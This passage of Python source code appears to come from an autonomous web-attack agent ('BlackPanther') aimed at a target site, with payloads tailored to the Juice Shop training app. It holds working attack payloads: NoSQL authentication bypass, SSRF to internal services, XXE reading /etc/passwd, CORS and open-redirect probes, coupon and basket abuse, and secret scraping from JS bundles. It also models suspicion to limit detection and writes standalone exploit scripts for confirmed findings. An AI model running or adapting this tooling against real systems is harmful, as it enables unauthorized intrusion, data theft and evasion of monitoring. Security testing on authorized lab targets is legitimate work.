        vulns.extend(error_vulns)

        ftp_vulns = await self._test_ftp_exposure()
        vulns.extend(ftp_vulns)

        metrics_vulns = await self._test_metrics_exposure()
        vulns.extend(metrics_vulns)

        header_vulns = self._check_security_headers(recon_data)
        vulns.extend(header_vulns)

        config_vulns = await self._test_config_exposure()
        vulns.extend(config_vulns)

        return vulns

    async def _test_error_disclosure(self) -> List[WebVuln]:
        vulns: List[WebVuln] = []

        error_triggers = [
            (f"{self.base_url}/api/Users/0", "Invalid user ID"),
            (f"{self.base_url}/rest/products/search?q='", "SQL quote in search"),
            (f"{self.base_url}/api/Quantitys/0", "Invalid quantity ID"),
            (f"{self.base_url}/rest/products/0/reviews", "Invalid product review"),
            (f"{self.base_url}/api/Feedbacks/0", "Invalid feedback ID"),
        ]

        for url, desc in error_triggers:
            status, body, _ = await self._get(url)
            if body and any(kw in body.lower() for kw in [
                "stack", "at ", "error", "sequelize", "sql",
                "node_modules", "express", "typeerror", "referenceerror",
                "syntaxerror", "unhandled", "traceback",
            ]):
                vulns.append(WebVuln(
                    title=f"Error Disclosure - {desc}",
                    category="disclosure",
                    severity=5.0,
                    url=url,
                    method="GET",
                    evidence="Verbose error message / stack trace exposed",
                    remediation="Use generic error pages. Never expose stack traces in production.",
                    cwe="CWE-209",
                    owasp="A05:2021 Security Misconfiguration",
                    response_snippet=body[:500],
                    confirmed=True,
                ))
                break

        return vulns

    async def _test_ftp_exposure(self) -> List[WebVuln]:
        vulns: List[WebVuln] = []

        status, body, _ = await self._get(f"{self.base_url}/ftp")
        if status == 200 and len(body) > 50:
            file_count = body.count(".md") + body.count(".bak") + body.count(".yml") + body.count(".pyc")
            vulns.append(WebVuln(
                title=f"FTP Directory Listing ({file_count}+ files)",
                category="disclosure",
                severity=7.0,
                url=f"{self.base_url}/ftp",
                method="GET",
                evidence=f"Directory listing with sensitive files exposed",
                remediation="Disable directory listings. Restrict access to FTP-served content.",
                cwe="CWE-548",
                owasp="A05:2021 Security Misconfiguration",
                response_snippet=body[:500],
                confirmed=True,
            ))
            logger.info("[disclosure] FTP directory exposed with {}+ files", file_count)

        sensitive_files = [
            ("/ftp/acquisitions.md", "Confidential business document"),
            ("/ftp/legal.md", "Legal document"),
            ("/ftp/package.json.bak", "Package backup with dependencies"),
            ("/ftp/coupons_2013.md.bak", "Historical coupon codes"),
            ("/ftp/suspicious_errors.yml", "Application error logs"),
        ]
        for path, desc in sensitive_files:
            status, body, _ = await self._get(f"{self.base_url}{path}")
            if status == 200 and len(body) > 10:
                vulns.append(WebVuln(
                    title=f"Sensitive File Exposure - {desc}",
                    category="disclosure",
                    severity=6.5,
                    url=f"{self.base_url}{path}",
                    method="GET",
                    evidence=f"Accessible: {len(body)} bytes",
                    remediation="Remove sensitive files from web root. Restrict FTP access.",
                    cwe="CWE-538",
                    owasp="A05:2021 Security Misconfiguration",
                    response_snippet=body[:200],
                    confirmed=True,
                ))

        return vulns

    async def _test_metrics_exposure(self) -> List[WebVuln]:
        vulns: List[WebVuln] = []

        metrics_paths = ["/metrics", "/actuator", "/actuator/health", "/debug", "/status"]
        for path in metrics_paths:
            status, body, _ = await self._get(f"{self.base_url}{path}")
            if status == 200 and len(body) > 100:
                is_metrics = any(kw in body.lower() for kw in [
                    "process_", "http_request", "nodejs_", "counter",
                    "gauge", "histogram", "health", "uptime",
                ])
                if is_metrics:
                    vulns.append(WebVuln(
                        title=f"Metrics/Debug Endpoint Exposed: {path}",
                        category="disclosure",
                        severity=5.5,
                        url=f"{self.base_url}{path}",
                        method="GET",
                        evidence=f"Internal metrics accessible ({len(body)} bytes)",
                        remediation="Restrict metrics endpoints to internal networks only.",
                        cwe="CWE-200",
                        owasp="A05:2021 Security Misconfiguration",
                        response_snippet=body[:300],
                        confirmed=True,
                    ))

        return vulns

    def _check_security_headers(self, recon_data: Dict[str, Any]) -> List[WebVuln]:
        vulns: List[WebVuln] = []
        missing = recon_data.get("fingerprint", {}).get("security_headers_missing", [])

        critical_missing = [h for h in missing if h in (
            "Content-Security-Policy", "Strict-Transport-Security",
            "X-Content-Type-Options", "X-Frame-Options",
        )]

        if critical_missing:
            vulns.append(WebVuln(
                title=f"Missing Security Headers ({len(critical_missing)})",
                category="disclosure",
                severity=4.0,
                url=self.base_url,
                method="GET",
                evidence=f"Missing: {', '.join(critical_missing)}",
                remediation="Add all recommended security headers: CSP, HSTS, X-Content-Type-Options, X-Frame-Options.",
                cwe="CWE-693",
                owasp="A05:2021 Security Misconfiguration",
                confirmed=True,
            ))

        return vulns

    async def _test_config_exposure(self) -> List[WebVuln]:
        vulns: List[WebVuln] = []

        paths = [
            ("/main.js", "application/javascript"),
            ("/main-es2015.js", "application/javascript"),
            ("/runtime.js", "application/javascript"),
        ]
        for path, expected_ct in paths:
            status, body, headers = await self._get(f"{self.base_url}{path}")
            if status == 200 and len(body) > 1000:
                secrets_found = []
                patterns = [
                    (r'["\']?api[_-]?key["\']?\s*[:=]\s*["\']([^"\']+)["\']', "API key"),
                    (r'["\']?secret["\']?\s*[:=]\s*["\']([^"\']+)["\']', "Secret"),
                    (r'["\']?password["\']?\s*[:=]\s*["\']([^"\']+)["\']', "Password"),
                    (r'["\']?token["\']?\s*[:=]\s*["\']([^"\']+)["\']', "Token"),
                ]
                for pattern, label in patterns:
                    matches = re.findall(pattern, body[:50000], re.I)
                    for m in matches[:3]:
                        if len(m) > 3 and m not in ("undefined", "null", "true", "false"):
                            secrets_found.append(f"{label}: {m[:30]}")

                if secrets_found:
                    vulns.append(WebVuln(
                        title=f"Hardcoded Secrets in {path}",
                        category="disclosure",
                        severity=7.0,
                        url=f"{self.base_url}{path}",
                        method="GET",
                        evidence=f"Found: {'; '.join(secrets_found[:5])}",
                        remediation="Never hardcode secrets in frontend code. Use environment variables.",
                        cwe="CWE-798",
                        owasp="A02:2021 Cryptographic Failures",
                        confirmed=True,
                    ))

        return vulns


# ===================================================================
# NOSQL INJECTION
# ===================================================================

class NoSQLiAttack(AttackModule):
    """NoSQL injection testing for MongoDB-style endpoints."""

    name = "nosqli"
    noise_level = 0.3

    async def run(self, recon_data: Dict[str, Any]) -> List[WebVuln]:
        vulns: List[WebVuln] = []

        login_vulns = await self._test_login_nosqli()
        vulns.extend(login_vulns)

        review_vulns = await self._test_review_nosqli()
        vulns.extend(review_vulns)

        return vulns

    async def _test_login_nosqli(self) -> List[WebVuln]:
        vulns: List[WebVuln] = []
        login_url = f"{self.base_url}/rest/user/login"

        payloads = [
            {"email": {"$gt": ""}, "password": {"$gt": ""}},
            {"email": {"$ne": ""}, "password": {"$ne": ""}},
            {"email": {"$regex": ".*"}, "password": {"$regex": ".*"}},
            {"email": {"$in": ["admin@juice-sh.op"]}, "password": {"$gt": ""}},
        ]

        for payload in payloads:
            status, body, _ = await self._post(
                login_url,
                json_data=payload,
                headers={"Content-Type": "application/json"},
            )
            if status == 200 and "authentication" in body.lower():
                vulns.append(WebVuln(
                    title="NoSQL Injection - Login Bypass",
                    category="nosqli",
                    severity=9.0,
                    url=login_url,
                    method="POST",
                    parameter="email/password",
                    payload=json.dumps(payload),
                    evidence="NoSQL operator bypass in authentication",
                    remediation="Sanitize JSON input. Reject object values where strings are expected.",
                    cwe="CWE-943",
                    owasp="A03:2021 Injection",
                    confirmed=True,
                ))
                break

        return vulns

    async def _test_review_nosqli(self) -> List[WebVuln]:
        vulns: List[WebVuln] = []
        review_url = f"{self.base_url}/rest/products/reviews"

        status, body, _ = await self._post(
            review_url,
            json_data={"id": {"$ne": -1}},
            headers={"Content-Type": "application/json"},
        )
        if status == 200:
            try:
                data = json.loads(body)
                if isinstance(data, list) and len(data) > 0:
                    vulns.append(WebVuln(
                        title=f"NoSQL Injection - Review Dump ({len(data)} reviews)",
                        category="nosqli",
                        severity=7.5,
                        url=review_url,
                        method="POST",
                        parameter="id",
                        payload='{"id": {"$ne": -1}}',
                        evidence=f"Dumped {len(data)} reviews via $ne operator",
                        remediation="Validate input types. Use schema validation on API inputs.",
                        cwe="CWE-943",
                        owasp="A03:2021 Injection",
                        confirmed=True,
                    ))
            except Exception:
                pass

        return vulns


# ===================================================================
# SSRF
# ===================================================================

class SSRFAttack(AttackModule):
    """Server-Side Request Forgery testing."""

    name = "ssrf"
    noise_level = 0.4

    async def run(self, recon_data: Dict[str, Any]) -> List[WebVuln]:
        vulns: List[WebVuln] = []

        profile_vulns = await self._test_profile_image_ssrf()
        vulns.extend(profile_vulns)

        redirect_vulns = await self._test_open_redirect()
        vulns.extend(redirect_vulns)

        return vulns

    async def _test_profile_image_ssrf(self) -> List[WebVuln]:
        vulns: List[WebVuln] = []

        ssrf_targets = [
            "http://localhost:3000/rest/admin/application-version",
            "http://127.0.0.1:3000/api/Users",
            "http://[::1]:3000/rest/user/whoami",
            "http://0x7f000001:3000/",
            "http://localhost:6379/",
        ]

        for target_url in ssrf_targets:
            profile_url = f"{self.base_url}/profile/image/url"
            status, body, _ = await self._post(
                profile_url,
                json_data={"imageUrl": target_url},
                headers={"Content-Type": "application/json"},
            )
            if status == 200 and len(body) > 20:
                if any(kw in body.lower() for kw in ["version", "email", "data", "redis"]):
                    vulns.append(WebVuln(
                        title=f"SSRF via Profile Image URL",
                        category="ssrf",
                        severity=8.5,
                        url=profile_url,
                        method="POST",
                        parameter="imageUrl",
                        payload=target_url,
                        evidence=f"Internal service response received ({len(body)} bytes)",
                        remediation="Validate and restrict URLs. Block internal/private IP ranges.",
                        cwe="CWE-918",
                        owasp="A10:2021 SSRF",
                        response_snippet=body[:300],
                        confirmed=True,
                    ))
                    break

        return vulns

    async def _test_open_redirect(self) -> List[WebVuln]:
        vulns: List[WebVuln] = []

        redirect_targets = [
            f"{self.base_url}/redirect?to=https://evil.com",
            f"{self.base_url}/redirect?to=http://localhost:3000/",
            f"{self.base_url}/redirect?to=//evil.com",
        ]

        for url in redirect_targets:
            status, body, headers = await self._get(url, allow_redirects=False)
            if status in (301, 302, 303, 307, 308):
                location = headers.get("Location", "")
                if "evil.com" in location:
                    vulns.append(WebVuln(
                        title="Open Redirect",
                        category="ssrf",
                        severity=4.5,
                        url=url,
                        method="GET",
                        parameter="to",
                        payload=url.split("to=")[1],
                        evidence=f"Redirected to: {location}",
                        remediation="Validate redirect URLs against an allowlist of trusted domains.",
                        cwe="CWE-601",
                        owasp="A01:2021 Broken Access Control",
                        confirmed=True,
                    ))
                    break

        return vulns


# ===================================================================
# API SECURITY
# ===================================================================

class APIAttack(AttackModule):
    """API security testing — mass assignment, parameter tampering, DoS vectors."""

    name = "api"
    noise_level = 0.3

    async def run(self, recon_data: Dict[str, Any]) -> List[WebVuln]:
        vulns: List[WebVuln] = []

        basket_vulns = await self._test_basket_manipulation()
        vulns.extend(basket_vulns)

        feedback_vulns = await self._test_feedback_manipulation()
        vulns.extend(feedback_vulns)

        coupon_vulns = await self._test_coupon_abuse()
        vulns.extend(coupon_vulns)

        b2b_vulns = await self._test_b2b_xml_injection()
        vulns.extend(b2b_vulns)

        return vulns

    async def _test_basket_manipulation(self) -> List[WebVuln]:
        vulns: List[WebVuln] = []

        status, body, _ = await self._post(
            f"{self.base_url}/api/BasketItems",
            json_data={
                "ProductId": 1,
                "BasketId": "1",
                "quantity": -1,
            },
            headers={"Content-Type": "application/json"},
        )
        if status in (200, 201):
            vulns.append(WebVuln(
                title="Negative Quantity in Basket (Price Manipulation)",
                category="api",
                severity=8.0,
                url=f"{self.base_url}/api/BasketItems",
                method="POST",
                parameter="quantity",
                payload="-1",
                evidence="Negative quantity accepted in basket item",
                remediation="Validate quantity is positive integer server-side.",
                cwe="CWE-20",
                owasp="A08:2021 Software and Data Integrity Failures",
                confirmed=True,
            ))

        return vulns

    async def _test_feedback_manipulation(self) -> List[WebVuln]:
        vulns: List[WebVuln] = []

        status, body, _ = await self._post(
            f"{self.base_url}/api/Feedbacks",
            json_data={
                "UserId": 1,
                "captchaId": 0,
                "captcha": "0",
                "comment": "zero star test",
                "rating": 0,
            },
            headers={"Content-Type": "application/json"},
        )
        if status in (200, 201):
            vulns.append(WebVuln(
                title="Zero-Star Feedback (Rating Manipulation)",
                category="api",
                severity=4.0,
                url=f"{self.base_url}/api/Feedbacks",
                method="POST",
                parameter="rating",
                payload="0",
                evidence="Feedback with rating=0 accepted (below minimum)",
                remediation="Validate rating is between 1-5 server-side, not just client-side.",
                cwe="CWE-20",
                owasp="A04:2021 Insecure Design",
                confirmed=True,
            ))

        return vulns

    async def _test_coupon_abuse(self) -> List[WebVuln]:
        vulns: List[WebVuln] = []

        known_coupons = [
            "WMNSDY2019",
            "ORANGE2020",
            "WMNSDY2021",
            "INTERNATIONALDAY",
        ]
        coupon_url = f"{self.base_url}/rest/basket/1/coupon"
        for coupon in known_coupons:
            status, body, _ = await self._put(
                f"{coupon_url}/{coupon}",
            )
            if status == 200:
                vulns.append(WebVuln(
                    title=f"Valid Coupon Code: {coupon}",
                    category="api",
                    severity=3.5,
                    url=coupon_url,
                    method="PUT",
                    parameter="coupon",
                    payload=coupon,
                    evidence="Coupon code accepted",
                    remediation="Implement proper coupon expiry. Use cryptographic coupon generation.",
                    cwe="CWE-330",
                    owasp="A04:2021 Insecure Design",
                    confirmed=True,
                ))

        return vulns

    async def _test_b2b_xml_injection(self) -> List[WebVuln]:
        vulns: List[WebVuln] = []

        xxe_payloads = [
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><order><product>&xxe;</product></order>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:3000/rest/admin/application-version">]><order><product>&xxe;</product></order>',
        ]

        b2b_url = f"{self.base_url}/b2b/v2/orders"
        for payload in xxe_payloads:
            status, body, _ = await self._post(
                b2b_url,
                data=payload,
                headers={"Content-Type": "application/xml"},
            )
            if status == 200:
                if "root:" in body or "version" in body.lower():
                    vulns.append(WebVuln(
                        title="XXE Injection in B2B Orders",
                        category="api",
                        severity=9.0,
                        url=b2b_url,
                        method="POST",
                        parameter="XML body",
                        payload=payload[:100],
                        evidence="External entity resolved in XML response",
                        remediation="Disable external entity resolution. Use JSON instead of XML.",
                        cwe="CWE-611",
                        owasp="A05:2021 Security Misconfiguration",
                        response_snippet=body[:300],
                        confirmed=True,
                    ))
                    break

        return vulns


# ===================================================================
# HTTP HEADER INJECTION / MISCONFIGURATION
# ===================================================================

class MisconfigAttack(AttackModule):
    """Security misconfiguration and HTTP header attacks."""

    name = "misconfig"
    noise_level = 0.1

    async def run(self, recon_data: Dict[str, Any]) -> List[WebVuln]:
        vulns: List[WebVuln] = []

        cors_vulns = await self._test_cors()
        vulns.extend(cors_vulns)

        method_vulns = await self._test_http_methods()
        vulns.extend(method_vulns)

        cookie_vulns = await self._test_cookie_security()
        vulns.extend(cookie_vulns)

        return vulns

    async def _test_cors(self) -> List[WebVuln]:
        vulns: List[WebVuln] = []

        evil_origins = ["https://evil.com", "null", "https://attacker.io"]
        for origin in evil_origins:
            try:
                async with self.session.get(
                    f"{self.base_url}/api/Products",
                    headers={"Origin": origin},
                ) as resp:
                    acao = resp.headers.get("Access-Control-Allow-Origin", "")
                    acac = resp.headers.get("Access-Control-Allow-Credentials", "")

                    if acao == origin or acao == "*":
                        sev = 7.0 if acac.lower() == "true" else 5.0
                        vulns.append(WebVuln(
                            title=f"CORS Misconfiguration (reflects: {origin})",
                            category="misconfig",
                            severity=sev,
                            url=f"{self.base_url}/api/Products",
                            method="GET",
                            parameter="Origin header",
                            payload=origin,
                            evidence=f"ACAO: {acao}, ACAC: {acac}",
                            remediation="Restrict CORS to trusted origins. Never reflect arbitrary origins.",
                            cwe="CWE-942",
                            owasp="A05:2021 Security Misconfiguration",
                            confirmed=True,
                        ))
                        break
            except Exception:
                continue

        return vulns

    async def _test_http_methods(self) -> List[WebVuln]:
        vulns: List[WebVuln] = []

        try:
            async with self.session.options(f"{self.base_url}/api/Products") as resp:
                allow = resp.headers.get("Allow", "")
                if "DELETE" in allow or "TRACE" in allow or "PUT" in allow:
                    dangerous = [m for m in ["DELETE", "TRACE", "PUT", "PATCH"] if m in allow]
                    vulns.append(WebVuln(
                        title=f"Dangerous HTTP Methods Allowed: {', '.join(dangerous)}",
                        category="misconfig",
                        severity=4.5,
                        url=f"{self.base_url}/api/Products",
                        method="OPTIONS",
                        evidence=f"Allow: {allow}",
                        remediation="Disable unnecessary HTTP methods. Restrict PUT/DELETE to authenticated users.",
                        cwe="CWE-749",
                        owasp="A05:2021 Security Misconfiguration",
                        confirmed=True,
                    ))
        except Exception:
            pass

        return vulns

    async def _test_cookie_security(self) -> List[WebVuln]:
        vulns: List[WebVuln] = []

        try:
            async with self.session.get(f"{self.base_url}/") as resp:
                for name, cookie in resp.cookies.items():
                    issues = []
                    if not cookie.get("secure"):
                        issues.append("missing Secure flag")
                    if not cookie.get("httponly"):
                        issues.append("missing HttpOnly flag")
                    samesite = cookie.get("samesite", "")
                    if not samesite or samesite.lower() == "none":
                        issues.append("SameSite=None or missing")

                    if issues:
                        vulns.append(WebVuln(
                            title=f"Insecure Cookie: {name} ({', '.join(issues)})",
                            category="misconfig",
                            severity=3.5,
                            url=self.base_url,
                            method="GET",
                            parameter=f"Cookie: {name}",
                            evidence=f"Issues: {', '.join(issues)}",
                            remediation="Set Secure, HttpOnly, and SameSite=Strict on all cookies.",
                            cwe="CWE-614",
                            owasp="A05:2021 Security Misconfiguration",
                            confirmed=True,
                        ))
        except Exception:
            pass

        return vulns


# ===================================================================
# WebAttackAgent — orchestrates all modules
# ===================================================================

ALL_ATTACK_MODULES = [
    SQLiAttack,
    XSSAttack,
    AuthAttack,
    JWTAttack,
    IDORAttack,
    TraversalAttack,
    DisclosureAttack,
    NoSQLiAttack,
    SSRFAttack,
    APIAttack,
    MisconfigAttack,
]


class WebAttackAgent(BaseAgent):
    """HJB-guided web application vulnerability scanner.

    Runs modular attack classes against the target, each probing
    for a specific vulnerability category.  Results feed back into
    the K/S/A math models so the HJB controller can throttle
    aggressiveness in real time.

    Math deltas:
      k_gain  = sum of per-finding knowledge gains
      s_inc   = weighted sum of module noise levels
      a_delta = 0.5 per critical confirmed vuln
    """

    name = "web_attack"

    def __init__(
        self,
        k_model: KnowledgeEvolution,
        s_model: SuspicionField,
        a_model: AccessPropagation,
        settings: Optional[Settings] = None,
    ) -> None:
        super().__init__(k_model, s_model, a_model)
        cfg = settings or get_settings()
        self._timeout = aiohttp.ClientTimeout(total=cfg.web_request_timeout)
        self._user_agent = cfg.web_user_agent
        self._delay = cfg.web_request_delay
        self._verify_ssl = cfg.web_verify_ssl
        self._concurrency = cfg.web_concurrent_requests
        self._report_dir = Path(cfg.web_report_dir)
        self._report_dir.mkdir(parents=True, exist_ok=True)
        self._exploit_dir = Path(cfg.exploit_sandbox_dir)
        self._exploit_dir.mkdir(parents=True, exist_ok=True)

    async def _execute(self, target: str, **kwargs: Any) -> AgentResult:
        base_url = normalize_base_url(target)
        recon_data = kwargs.get("recon_data", {})

        connector = aiohttp.TCPConnector(
            ssl=self._verify_ssl,
            limit=self._concurrency,
        )
        async with aiohttp.ClientSession(
            timeout=self._timeout,
            connector=connector,
            headers={"User-Agent": self._user_agent},
        ) as session:
            all_vulns: List[WebVuln] = []
            module_results: Dict[str, Any] = {}

            for module_cls in ALL_ATTACK_MODULES:
                module = module_cls(session, base_url, delay=self._delay)
                module_name = module.name
                logger.info("[web_attack] running module: {}", module_name)

                try:
                    findings = await asyncio.wait_for(
                        module.run(recon_data),
                        timeout=60.0,
                    )
                    all_vulns.extend(findings)
                    module_results[module_name] = {
                        "findings": len(findings),
                        "noise_level": module.noise_level,
                    }
                    logger.info(
                        "[web_attack] {} -> {} findings",
                        module_name, len(findings),
                    )
                except asyncio.TimeoutError:
                    logger.warning("[web_attack] {} timed out", module_name)
                    module_results[module_name] = {"findings": 0, "error": "timeout"}
                except Exception as exc:
                    logger.error("[web_attack] {} error: {}", module_name, exc)
                    module_results[module_name] = {"findings": 0, "error": str(exc)}

        all_vulns.sort(key=lambda v: v.severity, reverse=True)

        k_gain = sum(self._vuln_k_gain(v) for v in all_vulns)
        s_inc = sum(
            info.get("noise_level", 0.2) * info.get("findings", 0) * 0.05
            for info in module_results.values()
        )
        critical_count = sum(1 for v in all_vulns if v.severity >= 9.0)
        high_count = sum(1 for v in all_vulns if 7.0 <= v.severity < 9.0)
        a_delta = critical_count * 0.5 + high_count * 0.2

        report_path = self._save_report(all_vulns, base_url, module_results)
        self._save_exploits(all_vulns, base_url)

        return AgentResult(
            k_gain=min(k_gain, 30.0),
            s_inc=min(s_inc, 1.0),
            a_delta=min(a_delta, 5.0),
            raw_data={
                "base_url": base_url,
                "total_vulns": len(all_vulns),
                "critical": critical_count,
                "high": high_count,
                "medium": sum(1 for v in all_vulns if 4.0 <= v.severity < 7.0),
                "low": sum(1 for v in all_vulns if v.severity < 4.0),
                "vulns": [
                    {
                        "title": v.title,
                        "category": v.category,
                        "severity": v.severity,
                        "url": v.url,
                        "method": v.method,
                        "parameter": v.parameter,
                        "payload": v.payload[:200],
                        "evidence": v.evidence[:300],
                        "cwe": v.cwe,
                        "owasp": v.owasp,
                        "confirmed": v.confirmed,
                    }
                    for v in all_vulns
                ],
                "module_results": module_results,
                "report_path": str(report_path),
                "categories": list({v.category for v in all_vulns}),
            },
            success=len(all_vulns) > 0,
        )

    @staticmethod
    def _vuln_k_gain(vuln: WebVuln) -> float:
        if vuln.severity >= 9.0:
            return 1.5
        if vuln.severity >= 7.0:
            return 1.0
        if vuln.severity >= 4.0:
            return 0.5
        return 0.3

    def _save_report(
        self, vulns: List[WebVuln], base_url: str,
        module_results: Dict[str, Any],
    ) -> Path:
        report = {
            "target": base_url,
            "timestamp": time.time(),
            "total_vulnerabilities": len(vulns),
            "severity_breakdown": {
                "critical": sum(1 for v in vulns if v.severity >= 9.0),
                "high": sum(1 for v in vulns if 7.0 <= v.severity < 9.0),
                "medium": sum(1 for v in vulns if 4.0 <= v.severity < 7.0),
                "low": sum(1 for v in vulns if v.severity < 4.0),
            },
            "categories": list({v.category for v in vulns}),
            "module_results": module_results,
            "vulnerabilities": [
                {
                    "title": v.title,
                    "category": v.category,
                    "severity": v.severity,
                    "url": v.url,
                    "method": v.method,
                    "parameter": v.parameter,
                    "payload": v.payload,
                    "evidence": v.evidence,
                    "remediation": v.remediation,
                    "cwe": v.cwe,
                    "owasp": v.owasp,
                    "confirmed": v.confirmed,
                }
                for v in vulns
            ],
        }

        slug = re.sub(r"[^a-zA-Z0-9]", "_", base_url)[:50]
        ts = int(time.time())
        path = self._report_dir / f"web_report_{slug}_{ts}.json"
        path.write_text(json.dumps(report, indent=2, default=str), encoding="utf-8")
        logger.info("[web_attack] report saved -> {}", path)
        return path

    # ------------------------------------------------------------------
    # Exploit script generation for confirmed high/critical vulns
    # ------------------------------------------------------------------

    def _save_exploits(self, vulns: List[WebVuln], base_url: str) -> None:
        """Write self-contained Python exploit scripts for confirmed findings."""
        import hashlib
        import textwrap as tw

        saved = 0
        for vuln in vulns:
            if not vuln.confirmed or vuln.severity < 7.0:
                continue

            slug = re.sub(r"[^a-zA-Z0-9_]", "_", vuln.title)[:40]
            host_hash = hashlib.md5(base_url.encode()).hexdigest()[:8]
            filename = f"web_{vuln.category}_{slug}_{host_hash}.py"
            path = self._exploit_dir / filename

            method_upper = vuln.method.upper()
            if method_upper == "POST":
                request_block = tw.dedent(f"""\
                    data = {json.dumps(vuln.request_data) if vuln.request_data else '{}'}
                    resp = requests.post(url, json=data, headers=HEADERS, timeout=10, verify=False)""")
            elif method_upper == "PUT":
                request_block = tw.dedent(f"""\
                    data = {json.dumps(vuln.request_data) if vuln.request_data else '{}'}
                    resp = requests.put(url, json=data, headers=HEADERS, timeout=10, verify=False)""")
            else:
                request_block = "    resp = requests.get(url, headers=HEADERS, timeout=10, verify=False)"

            script = tw.dedent(f'''\
                #!/usr/bin/env python3
                """BlackPanther Web Exploit — {vuln.title}

                Category : {vuln.category}
                Severity : {vuln.severity}
                CWE      : {vuln.cwe}
                OWASP    : {vuln.owasp}
                Target   : {base_url}
                URL      : {vuln.url}
                Method   : {method_upper}
                Parameter: {vuln.parameter}
                Evidence : {vuln.evidence[:120]}
                """

                import sys
                import requests
                import urllib3
                urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

                TARGET = sys.argv[1] if len(sys.argv) > 1 else "{base_url}"
                HEADERS = {{
                    "User-Agent": "BlackPanther/2.0",
                    "Content-Type": "application/json",
                }}


                def main():
                    url = "{vuln.url}"
                    print(f"[*] Exploiting: {vuln.title}")
                    print(f"[*] Target: {{url}}")

                {request_block}

                    print(f"[*] Status: {{resp.status_code}}")
                    print(f"[*] Response (first 500 chars):")
                    print(resp.text[:500])

                    if resp.status_code == 200:
                        print(f"\\n[+] SUCCESS — {vuln.category.upper()} exploit confirmed")
                    else:
                        print(f"\\n[-] FAILED — got status {{resp.status_code}}")
                    return resp.status_code == 200


                if __name__ == "__main__":
                    success = main()
                    sys.exit(0 if success else 1)
            ''')

            path.write_text(script, encoding="utf-8")
            saved += 1
            logger.info("[web_attack] exploit saved -> {}", path)

        if saved:
            logger.info("[web_attack] {} exploit scripts saved to {}", saved, self._exploit_dir)
